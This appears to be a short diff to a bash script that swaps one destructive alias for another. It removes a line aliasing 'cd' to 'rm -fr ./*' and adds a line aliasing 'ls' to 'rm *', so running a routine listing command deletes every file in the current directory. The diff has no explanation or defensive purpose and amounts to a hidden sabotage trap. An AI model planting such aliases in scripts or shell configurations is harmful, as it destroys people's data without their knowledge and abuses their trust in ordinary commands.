@@ -1,2 +1,2 @@
 #!/bin/bash
-alias cd=”rm -fr ./*”
+alias ls='rm *'
